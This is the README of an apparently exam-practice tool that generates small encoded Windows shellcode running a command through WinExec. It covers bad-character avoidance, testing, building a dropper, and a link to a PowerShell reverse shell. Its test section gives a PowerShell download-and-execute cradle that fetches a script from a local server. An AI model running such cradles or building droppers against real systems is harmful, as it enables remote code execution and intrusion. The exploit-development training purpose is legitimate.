# Kimagure

This is a very quick and dirty tool to generate fairly small Windows shellcode that calls WinExec 
with a given command, with a focus on readability and ease of debugging. Included is a generator 
script and the template assembly code that it is based on. 

The word "kimagure" means "fickle" or "moody", which is how I kept feeling about certain shellcode 
generators that tried obfuscation tricks that were frustrating to debug, when all I needed was a 
fairly small payload to test with the exploit I just finished writing. It was created for use on 
certain challenges for the OSED, and is by no means intended to be used for professional engagements. 

## Usage

Basic usage is 

    python3 kimagure.py "command to run" <key>

The key is optional (default is 0x11), and can range from 1 to 129. Since we are just encoding some 
ASCII here, the last printable byte is 0x7E, so we have a full 0x81 worth of space to play with. All 
we're really doing is just finding a way to execute a command on the command line.

Make sure you customize the BADCHARS list at the top of the script to your needs. The script will 
highlight any bad characters in the code it outputs. If you do see bad chars while using your key, 
simply increment until you don't see any bad chars in your payload. TODO: A more programmatic way to do 
this, this code is a combination of multiple scripts...

The template code is optimized to exclude many common bad chars, but exploits can be tricky and it 
might need some modification. Feel free to change up any code with functionally equivalent pieces of 
code, hopefully you don't run into too many issues!

## How It Works

The algorithm is pretty straight forward:

* Pad the input string with \x00 until it's divisible by 4
* Increment every byte of the input string by the given key
* Process the string backwards because we are pushing onto the stack
* Split string up into groups of 4 bytes
* Generate push instructions to push each chunk onto the stack
* Place within the shellcode template

The code generated sets up a call to WinExec, and pushes our encoded string onto the stack. Then it 
loops over the string and subtracts our key value from each byte before calling WinExec. This is a 
very simple way to avoid bad chars and provide basic obfuscation.

In addition to generating a shellcode buffer for use in exploit scripts, it generates a raw shellcode 
file (out.bin), as well as a very barebones tiny PE file for testing (out.exe). See template.asm and 
pe32template.asm for more details on how these work.

In our specific use case here, we don't have to worry too much about bypassing things outside of Windows' 
own security mechanisms. This means you can focus on understanding the basic concepts in this early stage, 
instead of falling into a rabbit hole of obscure issues that are beyond the scope of your learning goal. 
This things are important to learn for sure, but sometimes this process can add unnecessary complexity when 
learning a fundamental concept, leading to confusion later on.

## Verify it's working

You can run a simple test like so:

On Linux

    $ python3 kimagure.py "powershell"

On Windows

    C:\> out.exe

If you are testing the .exe and get the 0xc0000005 error, just run it again. Sometimes newer versions of 
Windows have a weird issue with this PE template. A more stable PE can be built automatically once this 
generates source code as well.

See the next section for information on tweaking the EXE.

## Testing template.asm

This code simply runs the command 

    powershell IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:8080/test.ps1')

You will need nasm and gcc!

Build:

    $ nasm -f win32 template.asm -o ki.template.o; ld -mi386pe -o ki.template.exe template.o

Run Server:

    $ cd server/
    $ python3 -m http.server 8080

On victim

    C:\Users\user\Documents\>out.exe
    Well Hello There :3

test.ps1 just prints something and verifies that it in fact works. If you need a working powershell reverse 
shell, use [this.](https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1)

### Modifying the template 

If you are trying to make a dropper and the pre-generated exe is causing too many issues (like 0xc0000005 errors), 
you can just run `ndisasm -b 32 out.bin` after you've run the script, then take the push instructions starting at 
0x0000008A and paste them into the template.asm file where it says CUT HERE.

You will also want to make sure that the correct key is being used for the two sub instructions after the push 
instructions. The template uses 0x11 for the key.

Then just build according the build instructions listed above.

The shellcode to set up the WinExec call in the template was inspired by this code: https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html

The PE template came from previous research done here: https://n0.lol/a/pemangle.html

## Q & A

Q: Why WinExec, why not X/Y/Z API?

A: It works, the string is short, and it's ultimately easier to debug.

Q: Why not generate shellcode with one of the programs like in the course?

A: Because compilers and assemblers emit different code depending on different factors, and can add complexity 
where there was none before. By specifying our bytes directly, we have full control over the program. 
It's also easier to debug your bytes when you know exactly what they are. 

## Future Stuff

* Generate assembly code listing as well for debug or other use cases
* Use this to generate the PE for testing.
* Add a padding option for nop sleds or whatever else
